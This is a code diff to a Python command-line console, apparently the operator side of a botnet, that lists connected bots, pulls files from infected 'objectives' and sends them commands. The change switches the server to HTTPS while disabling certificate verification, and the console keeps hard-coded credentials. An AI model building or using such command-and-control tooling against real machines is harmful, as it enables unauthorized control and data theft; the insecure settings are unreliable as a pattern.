@@ -7,7 +7,7 @@ import websockets
 
 
 # URL del bot server
-url = 'http://localhost:3000/'
+url = 'https://localhost:3000/'
 auth_credentials = ('botmaster', '1234')
 
 
@@ -149,7 +149,7 @@ class BotMasterCLI(cmd.Cmd):
     def do_bots(self, args):
         """Query for all the bots connected to the server"""
         
-        response = requests.get(url + "/bots", auth=auth_credentials)
+        response = requests.get(url + "bots", auth=auth_credentials, verify=False)
         if response.status_code == 200:
             print(response.json())
         else:
@@ -163,7 +163,7 @@ class BotMasterCLI(cmd.Cmd):
         else:
             objective = args_vec[0]
             filename = args_vec[1]
-            response = requests.get(url + f"/download?objective={objective}&filename={filename}", auth=auth_credentials)
+            response = requests.get(url + f"/download?objective={objective}&filename={filename}", auth=auth_credentials, verify=False)
             print(response.json())
             directory = f"downloads"
             try:
@@ -223,7 +223,7 @@ def parse_args(args):
 
 def send_command(body):
     json_payload = json.dumps(body)
-    response = requests.post(url + "/send-command", data=json_payload, auth=auth_credentials)
+    response = requests.post(url + "/send-command", data=json_payload, auth=auth_credentials, verify=False)
     if response.status_code == 200:
         print("Request was successful")
         print("Response:", response.json())
